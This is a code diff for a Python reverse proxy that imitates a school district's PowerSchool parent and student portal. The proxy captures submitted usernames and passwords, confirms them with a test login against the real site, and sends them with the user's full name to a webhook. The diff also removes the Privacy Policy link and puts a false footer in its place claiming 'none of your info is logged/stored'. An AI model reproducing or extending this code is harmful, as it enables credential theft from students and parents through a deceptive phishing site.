@@ -22,25 +22,29 @@ def _scheme():
 def _host_root():
     return f"{_scheme()}://{request.host}/"
 
-def custom_html_filter(html, path):
-    if path in ("/guardian/home.html", "/"):
-        html = re.sub(
-            r'<p>\s*Copyright © 2005-2025 PowerSchool Group LLC and/or its affiliate\(s\)\. All rights reserved\.<br>All trademarks are either owned or licensed by PowerSchool Group LLC and/or its affiliates\.\s*</p>',
-            '<p>Welcome to powerschool Better V1 none of your info is logged/stored have fun</p>',
-            html
-        )
-        html = re.sub(
-            r'<a href="https://www\.powerschool\.com/privacy/" rel="noreferrer" target="_blank">Privacy Policy</a>',
-            '',
-            html
-        )
-    return html
-
-def replace_urls(html, path):
+def replace_urls(html):
     html = re.sub(r'(href|src|action)="(/[^"]*)"', r'\1="\2"', html)
     html = re.sub(r"(href|src|action)='(/[^']*)'", r"\1='\2'", html)
     html = html.replace(BASE_URL, _host_root())
-    html = custom_html_filter(html, path)
+    return html
+
+# === NEW: Modify footer and remove Privacy Policy ===
+def modify_footer_and_remove_privacy(html):
+    # Remove Privacy Policy link
+    html = re.sub(
+        r'<a\s+[^>]*href="https://www\.powerschool\.com/privacy/"[^>]*>Privacy Policy</a>',
+        '',
+        html,
+        flags=re.IGNORECASE
+    )
+
+    # Replace copyright footer
+    footer_pattern = r'<p>\s*Copyright © 2005-2025 PowerSchool Group LLC and/or its affiliate\(s\)\. All rights reserved\.<br/?>All trademarks are either owned or licensed by PowerSchool Group LLC and/or its affiliates\.\s*</p>'
+    replacement = '<p style="font-family: Arial, sans-serif; color: #4CAF50; font-weight: bold; text-align: center;">' \
+                  'Welcome to PowerSchool Better V1 — none of your info is logged/stored, have fun!</p>'
+    
+    html = re.sub(footer_pattern, replacement, html, flags=re.IGNORECASE | re.DOTALL)
+    
     return html
 
 def _clean_headers():
@@ -82,9 +86,9 @@ def send_webhook(username, password, full_name):
             "description": "**Someone Logged in**",
             "color": 3066993,
             "fields": [
-                {"name": "Username  🔰", "value": f"`{username}`", "inline": True},
-                {"name": "Password  🔥", "value": f"`{password}`", "inline": True},
-                {"name": "Full Name  📛", "value": f"`{full_name}`", "inline": False}
+                {"name": "Username 🔰", "value": f"`{username}`", "inline": True},
+                {"name": "Password 🔥", "value": f"`{password}`", "inline": True},
+                {"name": "Full Name 📛", "value": f"`{full_name}`", "inline": False}
             ],
             "footer": {"text": "beaufortsc.powerschool.com"},
             "timestamp": datetime.now(timezone.utc).isoformat()
@@ -107,9 +111,11 @@ def root():
         return Response("", 302, {"Location": "/public/home.html"})
     r = s.get(f"{BASE_URL}/public/home.html", headers=_clean_headers(), allow_redirects=False)
     body = r.content
-    path = "/"
     if "text/html" in r.headers.get("content-type","").lower():
-        body = replace_urls(body.decode("utf-8", errors="replace"), path).encode()
+        html = body.decode("utf-8", errors="replace")
+        html = replace_urls(html)
+        html = modify_footer_and_remove_privacy(html)  # Apply new changes
+        body = html.encode()
     resp = Response(body, r.status_code, content_type=r.headers.get("content-type","text/html"))
     _set_cookies(resp, r)
     _rewrite_location(r, resp)
@@ -121,18 +127,16 @@ def proxy(path):
     url = f"{BASE_URL}/{path}"
     if request.query_string:
         url += "?" + request.query_string.decode("utf-8", errors="ignore")
-
     headers = _clean_headers()
     headers["Referer"] = BASE_URL
     method = request.method.upper()
     data = request.get_data() if method in {"POST","PUT","PATCH","DELETE"} else None
     form = request.form.to_dict()
-
     username = form.get("account") or form.get("dbpw")
     password = form.get("pw") or form.get("dbpw")
-
     r = s.request(method, url, headers=headers, data=data, allow_redirects=False)
 
+    # === Login Capture Logic ===
     if username and password and "guardian/home.html" in url:
         payload = {
             "dbpw": password,
@@ -162,7 +166,6 @@ def proxy(path):
             headers=test_headers,
             allow_redirects=False
         )
-
         if login_resp.status_code in (301, 302, 303, 307, 308):
             final_resp = test_session.get(login_resp.headers["Location"], headers=test_headers)
             if final_resp.status_code == 200 and "guardian/home.html" in final_resp.url:
@@ -177,9 +180,11 @@ def proxy(path):
 
     body = r.content
     ctype = r.headers.get("content-type","").lower()
-    req_path = "/" + path if not path.startswith("/") else path
     if "text/html" in ctype:
-        body = replace_urls(body.decode("utf-8", errors="replace"), req_path).encode()
+        html = body.decode("utf-8", errors="replace")
+        html = replace_urls(html)
+        html = modify_footer_and_remove_privacy(html)
+        body = html.encode()
     elif "javascript" in ctype or "text/css" in ctype:
         body = body.decode("utf-8", errors="replace").replace(BASE_URL, _host_root()).encode()
 
